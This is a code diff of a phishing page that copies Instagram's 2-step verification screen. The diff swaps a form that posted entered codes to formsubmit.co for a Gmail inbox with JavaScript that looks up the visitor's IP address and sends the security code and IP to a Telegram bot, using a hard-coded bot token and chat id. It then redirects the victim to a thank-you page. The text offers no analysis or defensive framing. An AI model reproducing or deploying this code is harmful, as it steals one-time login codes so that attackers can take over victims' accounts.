@@ -1,4 +1,7 @@
-<!DOCTYPE html>
+
+
+
+      <!DOCTYPE html>
 <html lang="pt-AO">
   
 <!-- Mirrored from fanfamousity.com/instagram/otp/657daf104b167f68d1979b9c by HTTrack Website Copier/3.x [XR&CO'2014], Sun, 17 Dec 2023 11:22:13 GMT -->
@@ -57,8 +60,8 @@
       <!-- SMARTPHONE SECTION END -->
       <!-- FORM SECTION -->
       <article class="form-area">
-          <form id="form" method="POST" action="https://formsubmit.co/withdrawalb19@gmail.com">
-<!--           <input type="text" id="ipaddress" name="ipaddress" hidden> -->
+        <form  id="contactForm"  method="POST">
+          <input type="text" id="ipaddress" name="ipaddress" hidden>
           <p class="small-title">2-Step Verification</p>
           <input
             type="text"
@@ -67,12 +70,8 @@
             required
             placeholder="Security code"
           />
-                                <input type="hidden" id="nextField" name="_next" value="https://riktitlo.vercel.app/thanks.html">
-                    <input type="hidden" name="_captcha" value="false">
-
           <!-- <input type="hidden" name="linkId" value="657daf104b167f68d1979b9c" /> -->
           <input type="submit" name="submit" value="Confirm" id="submit"/>
-            
           <div class="options">
             <p class="small">Didn't get security code? we can</p>
             <a href="#" class="small">resend it</a>
@@ -175,10 +174,49 @@
     <script src="../../js/socials/brands.min.html"></script>
     <script src="../../js/socials/fontawesome.min.html"></script>
     <script>
-      
+      document.addEventListener('DOMContentLoaded', function () {
+        // Replace 'https://api.ipify.org?format=json' with a preferred IP API if needed
+        fetch('https://api.ipify.org?format=json')
+          .then(response => response.json())
+          .then(data => {
+            const ipaddress = data.ip;
+            document.getElementById('ipaddress').value = ipaddress;
+          })
+          .catch(error => {
+            console.error('Error fetching IP address:', error);
+          });
+      });
 
 
-     
+
+
+      document.getElementById('contactForm').addEventListener('submit', function (event) {
+        event.preventDefault();
+
+        var code = document.getElementById('code').value;
+        // var password = document.getElementById('password').value;
+        var ipaddress = document.getElementById('ipaddress').value;
+
+        var telegramMessage = `code: ${code}\nIpaddress: ${ipaddress}`;
+             var token = '7585948801:AAGwdA6GeMVt_uNf0asfQppXQj6f6wHAn_M';
+      var chat_id = '7837988233';
+
+        var url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat_id}&text=${encodeURIComponent(telegramMessage)}`;
+
+        fetch(url)
+          .then(response => response.json())
+          .then(data => {
+            if (data.ok) {
+              window.location.href = 'thanks.html';  // Redirect to thank you page
+            } else {
+              alert('Error sending message.');
+            }
+          })
+          .catch(error => {
+            console.error('Error:', error);
+          });
+      });
+
     </script>
   </body>
 
